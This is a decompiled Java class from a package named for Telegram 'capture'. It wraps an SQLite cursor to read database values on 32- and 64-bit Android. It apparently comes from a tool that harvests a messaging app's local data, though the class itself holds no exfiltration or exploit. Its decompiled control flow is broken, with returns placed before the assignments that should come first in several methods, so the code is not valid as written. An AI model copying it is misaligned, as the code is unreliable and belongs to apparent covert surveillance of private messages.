package com.vvt.capture.telegram.internal.SQLite;

import android.database.Cursor;
import android.os.Build;

public class SQLiteCursor
{
  Cursor mCursor;
  SQLiteCursorNative mCursorNative;
  
  public byte[] byteArrayValue(int paramInt)
  {
    boolean bool = isRunningOn64Bits();
    if (bool) {}
    for (byte[] arrayOfByte = (byte[])this.mCursor.getBlob(paramInt).clone();; arrayOfByte = this.mCursorNative.byteArrayValue(paramInt)) {
      return arrayOfByte;
    }
  }
  
  public void dispose()
  {
    boolean bool = isRunningOn64Bits();
    Object localObject;
    if (bool)
    {
      localObject = this.mCursor;
      ((Cursor)localObject).close();
    }
    for (;;)
    {
      return;
      localObject = this.mCursorNative;
      ((SQLiteCursorNative)localObject).dispose();
    }
  }
  
  public int intValue(int paramInt)
  {
    boolean bool = isRunningOn64Bits();
    Object localObject;
    if (bool) {
      localObject = this.mCursor;
    }
    for (int i = ((Cursor)localObject).getInt(paramInt);; i = ((SQLiteCursorNative)localObject).intValue(paramInt))
    {
      return i;
      localObject = this.mCursorNative;
    }
  }
  
  public boolean isNull(int paramInt)
  {
    boolean bool = isRunningOn64Bits();
    Object localObject;
    if (bool) {
      localObject = this.mCursor;
    }
    for (bool = ((Cursor)localObject).isNull(paramInt);; bool = ((SQLiteCursorNative)localObject).isNull(paramInt))
    {
      return bool;
      localObject = this.mCursorNative;
    }
  }
  
  boolean isRunningOn64Bits()
  {
    String str1 = Build.CPU_ABI;
    String str2 = "arm64-v8a";
    boolean bool = str1.equalsIgnoreCase(str2);
    if (bool) {
      bool = true;
    }
    for (;;)
    {
      return bool;
      bool = false;
      str1 = null;
    }
  }
  
  public long longValue(int paramInt)
  {
    boolean bool = isRunningOn64Bits();
    Object localObject;
    if (bool) {
      localObject = this.mCursor;
    }
    for (long l = ((Cursor)localObject).getLong(paramInt);; l = ((SQLiteCursorNative)localObject).longValue(paramInt))
    {
      return l;
      localObject = this.mCursorNative;
    }
  }
  
  public boolean next()
  {
    boolean bool = isRunningOn64Bits();
    Object localObject;
    if (bool) {
      localObject = this.mCursor;
    }
    for (bool = ((Cursor)localObject).moveToNext();; bool = ((SQLiteCursorNative)localObject).next())
    {
      return bool;
      localObject = this.mCursorNative;
    }
  }
  
  public void setCursor(Object paramObject)
  {
    boolean bool = paramObject instanceof SQLiteCursorNative;
    if (bool)
    {
      Object localObject = paramObject;
      localObject = (SQLiteCursorNative)paramObject;
      this.mCursorNative = ((SQLiteCursorNative)localObject);
    }
    bool = paramObject instanceof Cursor;
    if (bool)
    {
      paramObject = (Cursor)paramObject;
      this.mCursor = ((Cursor)paramObject);
    }
  }
  
  public String stringValue(int paramInt)
  {
    boolean bool = isRunningOn64Bits();
    if (bool) {}
    for (String str = this.mCursor.getString(paramInt);; str = this.mCursorNative.stringValue(paramInt)) {
      return str;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/SQLite/SQLiteCursor.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */